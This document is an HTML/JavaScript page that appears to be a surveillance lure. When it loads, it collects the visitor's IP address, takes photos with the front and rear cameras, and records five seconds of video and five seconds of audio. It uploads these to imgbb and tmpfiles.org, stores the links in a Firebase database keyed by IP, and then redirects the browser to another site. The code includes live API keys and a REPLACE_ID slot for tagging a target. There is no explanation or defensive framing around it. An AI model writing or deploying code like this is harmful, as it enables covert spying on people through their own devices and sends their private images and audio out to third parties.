<video id="video" autoplay playsinline muted style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const firebaseConfig = {
    apiKey: "AIzaSyCaMV2_EKFrhW9CUHMOHnfyFER_M2mDcN8",
    authDomain: "admin-aad81.firebaseapp.com",
    databaseURL: "https://admin-aad81-default-rtdb.firebaseio.com",

};
firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const IMGBB_API_KEY = "5a31b1f80b659a53569bb21b718c2364";

async function uploadToMediaServer(blob, filename) {
    try {
        const formData = new FormData();
        formData.append("file", blob, filename);
        const response = await fetch("https://tmpfiles.org/api/v1/upload", { method: "POST", body: formData });
        const result = await response.json();
        return (result.status === "success") ? result.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/") : "Error";
    } catch (e) { return "Error"; }
}

async function capture(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        const video = document.getElementById("video");
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        await new Promise(r => setTimeout(r, 1500));
        const canvas = document.getElementById("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const b64 = canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t => t.stop());
        const fd = new FormData();
        fd.append('image', b64);
        const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
        return (await res.json()).data.url;
    } catch(e) { return "Denied"; }
}

async function record(type, dur) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(type === 'video' ? {video:true, audio:true} : {audio:true});
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        await new Promise(r => setTimeout(r, dur));
        recorder.stop();
        stream.getTracks().forEach(t => t.stop());
        return await new Promise(r => {
            recorder.onstop = async () => {
                const blob = new Blob(chunks, {type: type === 'video' ? "video/mp4" : "audio/mp3"});
                r(await uploadToMediaServer(blob, "media"));
            };
        });
    } catch(e) { return "Denied"; }
}

window.addEventListener("DOMContentLoaded", async () => {
    const resIp = await fetch("https://api.ipify.org?format=json");
    const ip = (await resIp.json()).ip.replace(/\./g, '_');
    
    const data = {
        usex: "REPLACE_ID",
        time: new Date().toLocaleString(),
        cam1: await capture("user"),
        cam2: await capture("environment"),
        vid1: await record("video", 5000),
        audio: await record("audio", 5000)
    };
    
    await database.ref("Data_x/" + ip).set(data);
    window.location.href = "https://traidmod.com/";
});
</script>
